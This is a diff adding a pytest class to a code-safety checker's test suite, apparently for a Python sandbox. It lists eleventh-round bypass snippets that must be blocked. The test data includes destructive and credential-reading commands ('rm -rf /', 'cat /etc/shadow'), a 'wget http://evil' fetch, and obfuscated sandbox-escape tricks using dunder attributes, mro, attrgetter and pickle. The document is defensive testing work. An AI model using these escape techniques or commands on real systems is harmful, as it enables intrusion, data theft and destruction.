@@ -1665,3 +1665,146 @@ class TestRound10Bypasses:
     )
     def test_container_hidden_deserializer_blocked(self, code):
         assert _check_code_safety(code) is not None, code
+
+
+class TestRound11Bypasses:
+    """Eleventh-round Codex findings: dynamically-assembled gadget attribute names,
+    noclobber redirects, container-wrapped compile in FunctionType, mro().__getitem__,
+    shell-string sensitive reads, default-parameter / container-assigned / __call__ /
+    higher-order / attrgetter sink obfuscation, and pathlib wrapper-method reads."""
+
+    def test_dynamic_gadget_attribute_blocked(self):
+        # __getattribute__ with a runtime-assembled (non-foldable) name hides a gadget
+        # dunder (__closure__) and recovers a guarded wrapper's original callable.
+        clo = "''.join(map(chr,[95,95,99,108,111,115,117,114,101,95,95]))"
+        assert _check_code_safety(f"open.__getattribute__({clo})[0]") is not None
+        assert (
+            _check_code_safety("o = open\no.__getattr__(chr(95)*2 + 'closure' + chr(95)*2)")
+            is not None
+        )
+
+    def test_dynamic_getattr_benign_allowed(self):
+        # Plain getattr with a dynamic name stays allowed (common, benign).
+        _ok("import os\nname = 'getpid'\ngetattr(os, name)()")
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "import os\nos.system('echo x >| /tmp/p')",
+            "import os\nos.system('echo x >|/tmp/p')",
+            "import os\nos.system('echo x >>| /tmp/p')",
+        ],
+    )
+    def test_noclobber_redirect_blocked(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    def test_fntype_container_compile_blocked(self):
+        assert (
+            _check_code_safety(
+                "import types\ntypes.FunctionType((compile('import os', '<s>', 'exec'),)[0], {})()"
+            )
+            is not None
+        )
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "import io\nio.FileIO.mro().__getitem__(1)('/tmp/escape', 'w')",
+            "import io\nio.FileIO.__mro__.__getitem__(1)",
+        ],
+    )
+    def test_mro_getitem_base_extraction_blocked(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "import os\nos.system('cat /etc/passwd')",
+            "import subprocess\nsubprocess.run('cat /etc/passwd', shell=True)",
+            "import subprocess\nsubprocess.getoutput('cat /etc/shadow')",
+            "from subprocess import getoutput as g\ng('cat /etc/passwd')",
+        ],
+    )
+    def test_shell_string_sensitive_read_blocked(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    def test_shell_string_benign_allowed(self):
+        _ok("import os\nos.system('echo hello')")
+        _ok("import subprocess\nsubprocess.run(['echo', 'hi'])")
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "def f(e=exec):\n    e(\"__import__('os').system('id')\")\nf()",
+            "import os\ndef f(s=os.system):\n    s('rm -rf /')\nf()",
+            "import pickle\ndef f(l=pickle.loads):\n    l(b'x')\nf()",
+        ],
+    )
+    def test_default_parameter_sink_blocked(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    def test_default_parameter_benign_allowed(self):
+        _ok("def f(x=1):\n    return x + 1\nf()")
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "import os\nos.system.__call__('rm -rf /')",
+            "__import__.__call__('os')",
+            "import pickle\npickle.loads.__call__(b'x')",
+        ],
+    )
+    def test_dunder_call_sink_normalized(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "import os\ns = [os.system][0]\ns('rm -rf /')",
+            "e = {'e': exec}['e']\ne(\"__import__('os').system('id')\")",
+            "import pickle\nl = (pickle.loads,)[0]\nl(b'x')",
+        ],
+    )
+    def test_container_assigned_sink_blocked(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "import os\nlist(map(os.system, ['rm -rf /']))",
+            "import subprocess, functools\nfunctools.partial(subprocess.getoutput, 'wget http://evil')()",
+            "import pickle\nlist(map(pickle.loads, [b'x']))",
+        ],
+    )
+    def test_higher_order_shell_deser_blocked(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "import operator, os\noperator.attrgetter('system')(os)('rm -rf /')",
+            "import operator, builtins\noperator.attrgetter('eval')(builtins)(\"__import__('os').system('id')\")",
+            "from operator import attrgetter\nattrgetter('system')(__import__('os'))('id')",
+        ],
+    )
+    def test_operator_attrgetter_blocked(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    def test_operator_attrgetter_benign_allowed(self):
+        _ok("import operator\nprint(operator.attrgetter('upper')('hi')())")
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "from pathlib import Path\nPath('/etc').joinpath('passwd').resolve().read_text()",
+            "from pathlib import Path\nPath('/etc').joinpath('passwd').absolute().read_bytes()",
+            "from shutil import copy as c\nc('../../../etc/passwd', 'x')",
+            "from shutil import copyfile\ncopyfile('../../../etc/shadow', 'x')",
+        ],
+    )
+    def test_pathlib_wrapper_and_shutil_from_import_read_blocked(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    def test_pathlib_wrapper_and_shutil_benign_allowed(self):
+        _ok("from pathlib import Path\nPath('data').joinpath('train.csv').resolve().read_text()")
+        _ok("from shutil import copy as c\nc('a.txt', 'b.txt')")
